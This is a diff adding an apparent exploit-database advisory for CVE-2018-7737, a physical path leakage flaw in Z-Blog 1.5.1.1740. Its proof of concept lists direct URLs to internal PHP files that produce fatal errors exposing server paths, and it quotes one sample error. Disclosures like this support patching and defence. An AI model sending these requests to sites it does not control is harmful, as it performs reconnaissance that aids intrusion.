@@ -1,0 +1,74 @@
+# Exploit Title: Z-Blog 1.5.1.1740 Web Site physical path leakage Vulnerability
+# Date: 2018-04-03
+# Exploit Author: zzw (zzw@5ecurity.cn)
+# Vendor Homepage: https://www.zblogcn.com/
+# Software Link: https://github.com/zblogcn/zblogphp
+# Version: 1.5.1.1740
+# CVE : CVE-2018-7737
+
+This is a WebSite physical path leakage vulnerability .
+
+poc (visit the following pages):
+
+http://localhost/z-blog//zb_system/admin/admin_footer.php
+http://localhost/z-blog//zb_system/admin/admin_header.php
+http://localhost/z-blog//zb_system/admin/admin_left.php
+http://localhost/z-blog//zb_system/admin/admin_top.php
+http://localhost/z-blog//zb_system/function/c_system_admin.php
+http://localhost/z-blog//zb_system/function/c_system_misc.php
+http://localhost/z-blog//zb_system/function/lib/category.php
+http://localhost/z-blog//zb_system/function/lib/comment.php
+http://localhost/z-blog//zb_system/function/lib/dbmysql.php
+http://localhost/z-blog//zb_system/function/lib/dbmysqli.php
+http://localhost/z-blog//zb_system/function/lib/dbpdo_mysql.php
+http://localhost/z-blog//zb_system/function/lib/dbpdo_pgsql.php
+http://localhost/z-blog//zb_system/function/lib/dbpdo_sqlite.php
+http://localhost/z-blog//zb_system/function/lib/dbpgsql.php
+http://localhost/z-blog//zb_system/function/lib/dbsqlite.php
+http://localhost/z-blog//zb_system/function/lib/dbsqlite3.php
+http://localhost/z-blog//zb_system/function/lib/member.php
+http://localhost/z-blog//zb_system/function/lib/module.php
+http://localhost/z-blog//zb_system/function/lib/networkcurl.php
+http://localhost/z-blog//zb_system/function/lib/networkfile_get_contents.php
+http://localhost/z-blog//zb_system/function/lib/networkfsockopen.php
+http://localhost/z-blog//zb_system/function/lib/post.php
+http://localhost/z-blog//zb_system/function/lib/sqlmysql.php
+http://localhost/z-blog//zb_system/function/lib/sqlpgsql.php
+http://localhost/z-blog//zb_system/function/lib/sqlsqlite.php
+http://localhost/z-blog//zb_system/function/lib/tag.php
+http://localhost/z-blog//zb_system/function/lib/upload.php
+http://localhost/z-blog//zb_users/cache/compiled/default/comment.php
+http://localhost/z-blog//zb_users/cache/compiled/default/comments.php
+http://localhost/z-blog//zb_users/cache/compiled/default/index.php
+http://localhost/z-blog//zb_users/cache/compiled/default/module-archives.php
+http://localhost/z-blog//zb_users/cache/compiled/default/module-authors.php
+http://localhost/z-blog//zb_users/cache/compiled/default/module-catalog.php
+http://localhost/z-blog//zb_users/cache/compiled/default/module-comments.php
+http://localhost/z-blog//zb_users/cache/compiled/default/module-previous.php
+http://localhost/z-blog//zb_users/cache/compiled/default/module-statistics.php
+http://localhost/z-blog//zb_users/cache/compiled/default/module-tags.php
+http://localhost/z-blog//zb_users/cache/compiled/default/post-multi.php
+http://localhost/z-blog//zb_users/cache/compiled/default/post-page.php
+http://localhost/z-blog//zb_users/cache/compiled/default/post-single.php
+http://localhost/z-blog//zb_users/cache/compiled/default/sidebar.php
+http://localhost/z-blog//zb_users/cache/compiled/default/sidebar2.php
+http://localhost/z-blog//zb_users/cache/compiled/default/sidebar3.php
+http://localhost/z-blog//zb_users/cache/compiled/default/sidebar4.php
+http://localhost/z-blog//zb_users/cache/compiled/default/sidebar5.php
+http://localhost/z-blog//zb_users/cache/compiled/default/single.php
+http://localhost/z-blog//zb_users/plugin/AppCentre/include.php
+http://localhost/z-blog//zb_users/plugin/AppCentre/networkcurl.php
+http://localhost/z-blog//zb_users/plugin/AppCentre/networkfile_get_contents.php
+http://localhost/z-blog//zb_users/plugin/AppCentre/networkfsockopen.php
+http://localhost/z-blog//zb_users/plugin/STACentre/include.php
+http://localhost/z-blog//zb_users/plugin/Totoro/include.php
+http://localhost/z-blog//zb_users/plugin/UEditor/include.php
+http://localhost/z-blog//zb_users/plugin/UEditor/php/action_crawler.php
+http://localhost/z-blog//zb_users/plugin/UEditor/php/action_upload.php
+http://localhost/z-blog//zb_users/theme/default/include.php
+http://localhost/z-blog//zb_users/theme/metro/include.php
+http://localhost/z-blog//zb_users/theme/WhitePage/include.php
+
+the website will request like :   
+
+Fatal error: Interface 'iDataBase' not found in C:\phpStudy\WWW\Z-Blog\zb_system\function\lib\dbsqlite3.php on line 8
